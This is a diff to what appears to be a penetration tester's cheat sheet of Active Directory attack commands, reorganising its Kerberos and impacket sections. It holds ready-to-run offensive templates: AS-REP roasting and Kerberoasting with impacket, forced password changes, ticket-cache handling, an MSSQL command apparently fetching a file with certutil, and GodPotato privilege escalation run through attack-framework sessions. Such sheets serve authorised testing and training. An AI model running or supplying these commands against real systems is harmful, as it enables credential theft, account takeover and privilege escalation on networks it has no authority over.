@@ -264,8 +264,7 @@ shares
 use
 
 [*] Kerberos
-export KRB5_CONFIG="$PWD/custom_krb5.conf"
-nano ./custom_krb5.conf
+MYKRB5="custom_krb5.conf";export KRB5_CONFIG="$PWD/$MYKRB5"; nano ./"$MYKRB5"
 [libdefaults]
     default_realm = $KRB5DOM
     dns_lookup_realm = true
@@ -289,6 +288,8 @@ impacket-GetNPUsers -usersfile usernames $DOM/ -dc-ip "$TARGET"
 impacket-GetUserSPNs -request-user '$USERNAME' -dc-ip "$TARGET" $DOM/'$USERNAME':'$PASSWORD'
 impacket-GetUserSPNs -no-preauth '$USERNAME' -usersfile usernames -dc-host "$TARGET" $DOM/
 impacket-GetUserSPNs -request -dc-ip "$TARGET" $DOM/'$USERNAME':'$PASSWORD'
+impacket-changepasswd -dc-ip $TARGET $DC/'$USERNAME':'$PASSWORD'@$TARGET -newpass 'Password12345!'
+
 
 export KRB5CCNAME="$PWD/$USERNAME@SPN@$KRB5DOM.ccache"
 kinit -c "$PWD/$USERNAME@SPN@$KRB5DOM.ccache" '$USERNAME@$KRB5DOM'
@@ -305,9 +306,6 @@ netexec mssql $TARGET -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X 'certutil -urlca
 sessions -i 1 -c 'C:\programdata\GodPotato-NET4.exe -cmd "cmd /c whoami /priv"'
 sessions -i 1 -C 'getsystem'
 sessions -i 1
-
-[*] impacket
-impacket-changepasswd -debug -dc-ip $TARGET $DC/'$USERNAME':'$PASSWORD'@$TARGET -newpass 'NewPassword123!'
 
 # Post-Exploitation 
 ## Linux
